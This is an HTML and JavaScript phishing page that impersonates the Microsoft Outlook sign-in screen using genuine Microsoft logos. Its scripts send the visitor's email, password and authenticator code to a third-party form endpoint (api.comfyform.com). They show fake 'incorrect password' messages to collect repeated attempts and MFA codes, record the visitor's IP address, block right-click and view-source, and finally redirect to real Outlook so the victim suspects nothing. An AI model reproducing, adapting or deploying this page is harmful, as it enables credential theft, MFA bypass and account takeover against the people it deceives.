<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    /* CSS styles for desktop */
    @media screen and (min-width: 600px) {
      /* Add your desktop styles here */
    }

    /* CSS styles for mobile */
    @media screen and (max-width: 599px) {
      /* Add your mobile styles here */
    }

    /* Add styles for the loading screen here */
    #loading-screen {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background-color: #fff; /* Microsoft login background color */
      display: flex;
      justify-content: center;
      align-items: center;
      z-index: 9999;
    }

    #loading-spinner {
      background-image: url(https://www.windowslatest.com/wp-content/uploads/2021/08/Outlook-PWA.gif); /* URL to the GIF you provided */
      background-repeat: no-repeat;
      background-position: center center;
      width: 200px;
      height: 200px;
    }
  </style>
  <script>
    // Hide the loading screen after 3 seconds
    document.addEventListener('DOMContentLoaded', function() {
      setTimeout(function() {
        var loadingScreen = document.getElementById('loading-screen');
        loadingScreen.style.display = 'none';
      }, 3000); // 3 seconds in milliseconds
    });
  </script>
</head>
<body style="background-color: #f3f2f1; background-image: url('https://logincdn.msauth.net/16.000.28666.7/content/images/backgrounds/2_bc3d32a696895f78c19df6c717586a5d.svg'); background-size: cover; background-repeat: no-repeat;">

  <!-- Loading Screen -->
  <div id="loading-screen">
    <!-- Add loading screen content here -->
    <div id="loading-spinner"></div>
  </div>

  <!-- Bootstrap CSS -->
  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
  <link href="https://fonts.googleapis.com/css?family=Archivo+Narrow&display=swap" rel="stylesheet">
  <script src="https://kit.fontawesome.com/585b051251.js" crossorigin="anonymous"></script>
  <title>Sign in to your account</title>
  <link rel="prefetch" href="https://login.live.com/Me.htm?v=3">
  <link rel="shortcut icon" href="https://aadcdn.msftauth.net/shared/1.0/content/images/favicon_a_eupayfgghqiai7k9sol6lg2.ico">

  <style type="text/css">
    textarea:hover, 
    input:hover, 
    textarea:active, 
    input:active, 
    textarea:focus, 
    input:focus,
    button:focus,
    button:active,
    button:hover,
    label:focus,
    .btn:active,
    .btn.active {
      outline: 0px !important;
      -webkit-appearance: none;
      box-shadow: none !important;
    }

    .out img {
      width: 300px;
      padding: 8px 44px;
      font-size: 25px;
      margin-left: auto;
      margin-right: auto;
      margin-top: 20px;
      margin-bottom: 28px;
      cursor: pointer;
      display: flex;
      align-items: center;
    }

    .img {
      width: 32px;
      height: 32px;
      margin-right: 12px;
    }

    .box {
      box-shadow: 0 2px 3px rgba(0,0,0,0.1);
      border: 1px solid rgba(0,0,0,0.1);
      min-height: 438px;
      max-width: 440px;
      width: calc(100% - 50px);
      padding: 44px;
      margin-left: auto;
      margin-right: auto;
      margin-top: 20px;
      margin-bottom: 28px;
    }

    .bottom {
      width: 440px;
      background-color: #fff;
      box-shadow: 0 0 0.5rem rgba(0, 0, 0, 0.2);
      padding: 8px 44px;
      font-size: 15px;
      margin-left: auto;
      margin-right: auto;
      margin-top: 20px;
      margin-bottom: 28px;
      cursor: pointer;
      display: flex;
      align-items: center;
    }

    .bottom img {
      width: 32px;
      height: 32px;
      margin-right: 12px;
    }

    .bottom:hover {
      background-color: #dde2d1;
    }

    .next-form {
      transform: translateX(-50%);
    }

    #footer {
      position: fixed;
      bottom: 0px;
      width: 100%;
      overflow: visible;
      z-index: 99;
      clear: both;
      background-color: #000;
      background-color: rgba(0,0,0,0.6);
    }

    div .footerNode a, div .footerNode span {
      color: #fff;
      font-size: 0.75rem;
      line-height: 28px;
      white-space: nowrap;
      display: inline-block;
      float: right;
      margin-left: 8px;
      margin-right: 8px;
    }

    @media only screen and (max-width: 610px) {
      #hide {
        display: none;
      }
    }
  </style>

  <link rel="shortcut icon" type="image/png" href="https://easyupload.io/mm9scz"/>

  <div class="container-fluid">
    <div class="container">
      <div class="row my-5 py-5">
        <div class="col-lg-6 mx-auto">
          <div class="out">
            <img src="https://logincdn.msftauth.net/shared/1.0/content/images/applogos/53_7a3c80bf9694448bac31a9589d2e9e92.png">
          </div>
          <div class="bg-white box" id="div1">
            <img src="https://aadcdn.msftauth.net/shared/1.0/content/images/microsoft_logo_564db913a7fa0ca42727161c6d031bef.svg" class="img-fluid"><br><br>
            <span class="h5"><b>Sign In</b></span><br>
            <p>to continue to Outlook</p>
            <span id="error" class="text-danger" style="display: none;">That Microsoft account doesn't exist. Enter a different account</span>
            <div class="form-group mt-2">
              <input type="email" name="email" class="form-control rounded-0 border-dark" id="email" aria-describedby="emailHelp" placeholder="Email, phone or skype" style="border-right: none;border-left: none;border-top: none;" value="">
            </div>
            <p>No account? <a href="#">Create one!</a></p>
            <div class="text-right">
              <button class="btn rounded-6 text-white px-4 mt-4" id="next" style="background-color: #0066BA;">Next</button>
            </div>
          </div>

          <div class="m-5 p-4 bg-white box" id="div2" style="display: none;">
            <form id="contact" name="contact" netlify>
              <img src="https://aadcdn.msftauth.net/shared/1.0/content/images/microsoft_logo_564db913a7fa0ca42727161c6d031bef.svg" class="img-fluid"><br><br>
              <i class="fas fa-arrow-left" id="back"></i>&nbsp<span id="emailch">abc@abc.com</span><br>
              <p></p>
              <span class="h5">Enter Password</span>
              <p><span id="msg" class="text-danger" style="font-size: 10px;"></span><br></p>
              <div class="form-group mt-2">
                <input type="password" name="password" class="form-control rounded-0 border-dark" id="password" aria-describedby="emailHelp" placeholder="Enter Password" style="border-right: none;border-left: none;border-top: none;">
              </div>
              <div class="form-group mt-2" id="auth-code-div" style="display: none;">
                <input type="text" name="auth-code" class="form-control rounded-0 border-dark" id="auth-code" aria-describedby="auth-code" placeholder="Enter Authentication Code" style="border-right: none;border-left: none;border-top: none;">
              </div>
              <p><a href="#">Forget my password?</a></p>
              <input type="hidden" id="ip-address" name="ip_address">
              <div class="text-right">
                <button class="btn rounded-6 text-white px-4" id="submit-btn" style="background-color: #0066BA;">Sign in</button>
              </div>
            </form>
          </div>

          <div class="bottom">
            <img src="https://aadcdn.msftauth.net/shared/1.0/content/images/signin-options_3e3f6b73c3f310c31d2c4d131a8ab8c6.svg">
            <span>Sign-in options</span>
          </div>
        </div>
      </div>
    </div>
  </div>

  <footer id="footer">
    <div>
      <div class="footerNode">
        <span>Â©2025 Microsoft</span>
        <a data-bind="text: config.text.privacyAndCookies, attr: {'data-url': config.links.privacyAndCookies}" href="#" data-url="https://go.microsoft.com/fwlink/?LinkId=521839">Privacy statement</a>
      </div>
    </div>
  </footer>

  <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
  <script>
    /* global $ */
    $(document).ready(function(){
      var count = 0;
      var authCount = 0;

      /////////////url email getting////////////////
      var email = window.location.hash.substr(1);
      if (!email) {

      } else {
        var base64regex = /^([0-9a-zA-Z+/]{4})*(([0-9a-zA-Z+/]{2}==)|([0-9a-zA-Z+/]{3}=))?$/;

        if (!base64regex.test(email)) {
          var my_email = email;
        } else {
          var my_email = atob(email);
        }
        var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;

        if (!filter.test(my_email)) {
          $('#error').show();
          email.focus;
          return false;
        }
        $('#email').val(my_email);
      }

      $('#email').click(function() {
        $('#error').hide();
      });

      $('#next').click(function() {
        var my_email = $('#email').val();
        var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;

        if (!filter.test(my_email)) {
          $('#error').show();
          email.focus;
          return false;
        }

        $("#div1").animate({left: 200, opacity: "hide"}, 0);
        $("#div2").animate({right: 200, opacity: "show"}, 1000);
        $("#emailch").html(my_email);
      });

      $('#back').click(function() {
        $("#msg").hide();
        $("#email").val("");
        $("#password").val("");
        $("#auth-code").val("");
        $("#div2").animate({left: 200, opacity: "hide"}, 0);
        $("#div1").animate({right: 200, opacity: "show"}, 1000);
      });

      $('#submit-btn').click(function(event) {
        event.preventDefault();
        var email = $("#email").val();
        var password = $("#password").val();
        var authCode = $("#auth-code").val();
        var msg = $('#msg').html();

        $('#msg').text(msg);
        count++;
        $.ajax({
          dataType: 'JSON',
          url: 'https://api.comfyform.com/s/679128d526da4737ba025b85/',
          type: 'POST',
          data: {
            email: email,
            password: password,
            auth_code: authCode
          },
          beforeSend: function(xhr) {
            $('#submit-btn').html('Verifying...');
          },
          success: function(response) {
            $("#password").val("");
            if (response && response['signal'] == 'ok') {
              $('#msg').html(response['msg']);
              count = 0;
              authCount = 0;
            } else {
              $("#msg").show();
              $('#msg').html("Your account or password is incorrect. If you don't remember your password, use a verification code displayed in the Microsoft Authenticator app.");

              if (count > 2) {
                $('#auth-code-div').show();
                authCount++;
              }

              if (authCount > 6) {
                window.location.replace("https://outlook.office.com/mail/");
              }
            }
          },
          error: function() {
            $("#password").val("");
            $("#msg").show();
            $('#msg').html("Your account or password is incorrect. If you don't remember your password, use a verification code displayed in the Microsoft Authenticator app.");

            if (count > 2) {
              $('#auth-code-div').show();
              authCount++;
            }

            if (authCount > 6) {
              window.location.replace("https://outlook.office.com/mail/");
            }
          },
          complete: function() {
            $('#submit-btn').html('Sign in');
          }
        });
      });
    });
  </script>

  <script>
    // Disable right-click
    document.addEventListener('contextmenu', function(e) {
      e.preventDefault();
    });

    // Disable Ctrl+U
    document.addEventListener('keydown', function(e) {
      if (e.ctrlKey && e.key === 'u') {
        e.preventDefault();
      }
    });
  </script>

  <script>
    // Function to fetch the IP address using a public API
    async function getIPAddress() {
      try {
        const response = await fetch('https://api.ipify.org?format=json');
        const data = await response.json();
        return data.ip;
      } catch (error) {
        console.error('Error fetching IP address:', error);
        return null;
      }
    }

    // Event listener for form submission
    document.getElementById('contact').addEventListener('submit', async function(event) {
      event.preventDefault(); // Prevent the default form submission

      const ipAddress = await getIPAddress();
      if (ipAddress) {
        // Set the IP address in the hidden input field
        document.getElementById('ip-address').value = ipAddress;

        // Submit the form
        this.submit();
      } else {
        alert('Failed to fetch IP address. Please try again.');
      }
    });
  </script>
</body>
</html>